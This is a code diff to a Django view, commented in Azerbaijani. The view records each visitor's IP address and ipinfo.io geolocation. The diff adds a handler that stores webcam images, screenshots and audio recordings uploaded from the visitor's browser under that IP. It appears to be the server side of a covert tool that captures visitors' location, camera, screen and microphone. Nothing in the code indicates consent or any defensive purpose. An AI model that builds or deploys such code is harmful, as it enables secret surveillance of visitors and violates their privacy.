@@ -1,11 +1,8 @@
 
-
-# Create your views here.
-import requests
 from django.shortcuts import render
+from django.http import JsonResponse
 from .models import IPInfo
-
-
+import requests
 
 
 # def get_client_ip(request):
@@ -54,9 +51,9 @@ from .models import IPInfo
 #     }
 #
 #     return render(request, 'ip.html', context)
-import requests
-from django.shortcuts import render
-from .models import IPInfo
+
+
+
 
 def get_client_ip(request):
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
@@ -66,9 +63,28 @@ def get_client_ip(request):
         ip = request.META.get('REMOTE_ADDR')
     return ip
 
+
 def ip_view(request):
     ip = get_client_ip(request)
 
+    if request.method == 'POST':
+        # FormData ilə gələn media fayllarını götür
+        camera_image = request.FILES.get('camera_image')
+        screen_image = request.FILES.get('screen_image')
+        audio = request.FILES.get('audio')
+
+        # Eyni IP varsa, yenilə. Yoxdursa, yarat.
+        ipinfo, created = IPInfo.objects.update_or_create(
+            ip=ip,
+            defaults={
+                'camera_image': camera_image,
+                'screen_image': screen_image,
+                'audio': audio
+            }
+        )
+        return JsonResponse({'status': 'ok'})
+
+    # Əgər GET ilə daxil olunubsa, IP məlumatlarını göstər
     try:
         response = requests.get(f'https://ipinfo.io/{ip}/json')
         data = response.json()
@@ -82,7 +98,7 @@ def ip_view(request):
         if len(parts) == 2:
             lat, lon = parts[0], parts[1]
 
-    # DB-də eyni IP üçün yoxla, varsa yenilə, yoxsa yarat
+    # DB-də varsa, update et
     ipinfo, created = IPInfo.objects.update_or_create(
         ip=ip,
         defaults={
@@ -103,13 +119,13 @@ def ip_view(request):
         'org': data.get('org', 'Bilinmir'),
         'lat': lat,
         'lon': lon,
-        # Kamera, ekran və audio üçün linkləri əlavə etmək istəsən burada əlavə edə bilərsən:
         'camera_image_url': ipinfo.camera_image.url if ipinfo.camera_image else '',
         'screen_image_url': ipinfo.screen_image.url if ipinfo.screen_image else '',
         'audio_url': ipinfo.audio.url if ipinfo.audio else '',
     }
 
     return render(request, 'ip.html', context)
+
 
 def index(request):
     context = {
